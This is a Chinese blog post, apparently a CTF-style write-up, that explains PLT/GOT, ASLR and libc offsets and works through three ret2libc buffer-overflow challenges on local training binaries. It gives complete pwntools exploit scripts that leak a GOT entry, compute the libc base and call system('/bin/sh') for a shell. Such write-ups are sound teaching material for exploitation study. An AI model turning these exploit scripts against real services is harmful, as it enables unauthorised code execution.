<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="郁涛丶"><title>PWN_Ret2libc · 郁涛丶's Blog</title><meta name="description" content="1.ret2libc1 先讲几个知识点：

system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。
PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。
GOT(Global"><meta name="keywords" content="郁涛丶博客,博客,郁涛丶"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">郁涛丶's Blog</a></h3><div class="description"><p>怕什么真理无穷， 进一寸有一寸的欢喜。</p></div></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/ghostasky"><i class="fa fa-github"></i></a></li><li><a href="mailto:2992721672@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2992721672"><i class="fa fa-qq"></i></a></li></ul><div class="footer"><div class="p"> <span>© 2017 - 2020 </span><i class="fa fa-star"></i><span> 郁涛丶</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/mrcore/hexo-theme-Anatole-Core" target="_blank">Anatole-Core  </a></div><div class="beian"><a href="http://www.beian.miit.gov.cn/" target="_blank">粤ICP备15011643号</a><span style="height:10px;margin-left: 10px;">|</span><img src="/images/gongan.png" style="height:10px;margin-left: 10px;position: relative;top: 1px;"><span style="margin-left: 2px;">粤公网安备 44030402003967号</span></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about/">关于</a></li><li><a href="/guestbook">随笔小记</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>PWN_Ret2libc</a></h3></div><div class="post-content"><h1 id="1-ret2libc1"><a href="#1-ret2libc1" class="headerlink" title="1.ret2libc1"></a>1.ret2libc1</h1><p> <strong>先讲几个知识点：</strong></p>
<ol>
<li>system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。</li>
<li>PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。</li>
<li>GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址，可以通过plt表跳转到got表来得到函数的真正地址。</li>
<li>地址随机化没有对PLT表和GOT表起作用。</li>
</ol>
<p>首先file和checksec一下<br><img src="/2021/01/28/pwn_ret2libc/1612006722313.png"><br>ida查看，没有后门函数，nx打开，且是动态链接程序<br><img src="/2021/01/28/pwn_ret2libc/1612006725796.png"><br>虽然说没有后门函数，但是调用了system函数：<br><img src="/2021/01/28/pwn_ret2libc/1612006729066.png"><br>并且有/bin/sh字符串：<br><img src="/2021/01/28/pwn_ret2libc/1612006733238.png"><br>gdb调试，ebp:0xffffd128<br><img src="/2021/01/28/pwn_ret2libc/1612006737011.png"><br>所以exp可以这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(system_plt)+<span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/28/pwn_ret2libc/1612006746037.png"></p>
<h1 id="2-ret2libc2"><a href="#2-ret2libc2" class="headerlink" title="2.ret2libc2"></a>2.ret2libc2</h1><p>这题与ret2libc1差不多，只是没有/bin/sh 字符串，所以需要我们自己写入</p>
<p>Exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">&quot;buf2&quot;</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(system_plt) +p32(buf2) +p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/28/pwn_ret2libc/1612006789960.png"><br>当然，exp也可以这样写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">&quot;buf2&quot;</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_ret = <span class="number">0x0804843d</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(pop_ret) +p32(buf2)+ p32(system_plt)+  p32(<span class="number">0xdeadbeef</span>)+p32(buf2) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="3-ret2libc3"><a href="#3-ret2libc3" class="headerlink" title="3.ret2libc3"></a>3.ret2libc3</h1><p>首先查看保护：<br><img src="/2021/01/28/pwn_ret2libc/1612006820930.png"><br><img src="/2021/01/28/pwn_ret2libc/1612006825043.png"><br>没有找到system函数和/bin/sh字符串。</p>
<p>如果知道libc中某个函数的地址，进而可以知道system函数的地址。</p>
<p>为得到libc中某个函数的地址，一般采用got表泄露，即输出某个函数对用的got表的内容。由于libc的延迟绑定机制，需要泄露已经执行过的函数的地址。这个机制大致就是在第一次调用某个函数的时候，这个函数的got表中存放的是下一条plt表的指令的地址，经过一系列操作后得到真实地址，然后将这个真实地址放到got表中，这样之后调用这个函数的时候在got表中可以直接找到真实地址。</p>
<p>因为在这之前已经运行过puts函数，so，got表中放着puts的真实地址，所以我们可以将puts的真实地址打印出来。</p>
<blockquote>
<p>libc基地址   +   函数偏移量    =   函数真实地址</p>
</blockquote>
<p>以下可以找到puts的真实地址：0xf7da9ca0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./ret2libc3&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(puts_plt) +p32(0xdeadbeef) + p32(puts_got)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = hex(u32(io.recv()[0:4]))</span><br><span class="line">print(puts_addr)</span><br></pre></td></tr></table></figure>


<p><img src="/2021/01/28/pwn_ret2libc/1612006831449.png"><br>找到了puts的真实地址，但是还需要知道libc的版本，其实根据真实地址是可以得到libc的版本的。</p>
<p>ASLR，地址随机化，但即是再随机化，它的低12位保持不变，因为内存页对齐的缘故。</p>
<p>0xf7da9ca0的低12位是ca0，这里有个网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
<p>可以根据低12位查到这个的版本<br><img src="/2021/01/28/pwn_ret2libc/1612006838772.png"><br>这样就得到了system函数的偏移和/bin/sh的偏移。</p>
<blockquote>
<p>system_offset = 0x03d2e0<br>puts_offset = 0x067ca0<br>bin_sh_offset = 0x17e0af</p>
</blockquote>
<p>完整EXP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(puts_plt_addr) + p32(main_plt_addr) + p32(puts_got_addr)</span><br><span class="line">#main_plt_addr可以使程序再次溢出</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line"></span><br><span class="line">sys_offset = 0x03d2e0</span><br><span class="line">puts_offset = 0x067ca0</span><br><span class="line">sh_offset = 0x17e0af</span><br><span class="line">#libc基地址 + 函数偏移 = 函数真实地址</span><br><span class="line">libc_base_addr = puts_addr - puts_offset</span><br><span class="line">sys_addr = libc_base_addr + sys_offset </span><br><span class="line">sh_addr = libc_base_addr + sh_offset </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*112 +p32(sys_addr) + p32(0xdeadbeef) +p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2021-01-28</span><i class="fa fa-tag"></i><a class="tag" href="/tags/PWN/" title="PWN">PWN </a><span class="leancloud_visitors"></span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2021/01/28/pwn_ret2libc/,郁涛丶's Blog,PWN_Ret2libc,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2021/02/01/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/" title="格式化字符串原理介绍及利用">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2021/01/27/pwn_ret2textret2syscallret2shellcode/" title="PWN_ret2text,ret2syscall,ret2shellcode">下一篇</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script></body></html>